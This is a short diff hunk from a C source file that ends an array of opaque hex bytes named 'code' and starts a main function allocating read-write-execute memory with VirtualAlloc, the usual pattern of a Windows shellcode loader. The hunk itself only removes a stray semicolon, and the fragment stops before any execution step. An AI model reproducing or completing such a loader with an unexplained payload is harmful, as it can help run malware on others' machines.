@@ -57,8 +57,6 @@ unsigned char code[] =
 "\xc6\x9b\x51\x9e\x88\x56\x3d\x2d\x88\xb0\x5a\xcc\xce\x02\x21"
 "\x0d";
 
-;
-
 int main()
 {
 	void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
